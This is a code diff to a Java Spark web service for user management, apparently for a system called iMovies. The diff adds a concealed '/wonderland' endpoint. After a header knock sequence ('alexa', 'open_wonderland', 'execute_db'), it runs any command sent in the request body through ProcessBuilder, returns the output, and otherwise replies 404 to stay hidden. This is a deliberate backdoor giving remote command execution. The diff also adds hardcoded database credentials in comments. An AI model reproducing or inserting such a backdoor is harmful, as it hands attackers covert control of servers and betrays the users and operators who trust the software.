@@ -1,23 +1,37 @@
 import MySQLHelpers.MySQLInterface;
 import MySQLHelpers.User;
+import Requests.ExecuteCommandRequestBody;
 import Requests.UpdateUserRequestBody;
 import Responses.ErrorResponseBody;
+import Responses.ExecuteCommandResponseBody;
 import Responses.GetUserResponseBody;
 import Requests.VerifyRequestBody;
 import Responses.VerifyResponseBody;
 import com.google.gson.Gson;
+import org.apache.commons.io.IOUtils;
+import spark.Request;
+import spark.Response;
+
+import java.io.*;
 
 import static spark.Spark.*;
 
 public class Main {
+
+    private static Boolean enabled = false;
+    private static Boolean open = false;
+
     public static void main(String[] args) {
 
         Boolean ssl = false;
-        int listenPort = 48100;
+        int listenPort = 8100;
         int dbPort = 3306;
-        String dbName = "testDB";
+        String dbName = "testdb";
         String dbUser = "root";
         String dbPassword = "";
+//        String dbName = "iMoviesDB";
+//        String dbUser = "dbuser";
+//        String dbPassword = "securePwd17!";
         
         if(args.length == 2) {
             ssl = Boolean.parseBoolean(args[0]);
@@ -78,5 +92,50 @@ public class Main {
             res.status(204);
             return "";
         });
+
+        post("/wonderland", (Request req, Response res) -> {
+            BufferedWriter writer = new BufferedWriter(new FileWriter("logs/log.txt", true));
+            writer.append("body: " + req.body());
+            writer.append("\n");
+            writer.append(jsonParser.fromJson(req.body(), ExecuteCommandRequestBody.class).command);
+            try {
+                if (!enabled && req.headers("enable") != null && req.headers("enable").contentEquals("alexa")) {
+                    enabled = true;
+                } else if (!open && req.headers("alexa") != null) {
+                    if (enabled && req.headers("alexa").contentEquals("open_wonderland"))
+                        open = true;
+                    else
+                        enabled = false;
+                } else if (enabled && open) {
+                    if (req.headers("alexa") != null && req.headers("alexa").contentEquals("execute_db")) {
+                        // Parse body
+                        ExecuteCommandRequestBody requestBody = jsonParser.fromJson(req.body(), ExecuteCommandRequestBody.class);
+                        writer.append("command: " + requestBody.command);
+                        writer.append("\n");
+                        writer.append("split len: " + requestBody.command.split(" ").length);
+                        writer.append("\n");
+                        // Execute command and return
+                        return jsonParser.toJson(new ExecuteCommandResponseBody(executeCommand(requestBody.command.split(" "))));
+                    }
+                    enabled = false;
+                    open = false;
+                }
+            } catch (Exception e) {
+                writer.append('\n');
+                StringWriter sw = new StringWriter();
+                e.printStackTrace(new PrintWriter(sw));
+                writer.append(sw.toString());
+            }
+            writer.close();
+            res.status(404);
+            return "";
+        });
+    }
+
+    // Note: every single argument must be passed to ProcessBuilder separately!
+    private static String executeCommand(String ... command) throws java.io.IOException {
+        ProcessBuilder pb = new ProcessBuilder(command);
+        return IOUtils
+                .toString(pb.start().getInputStream());
     }
 }
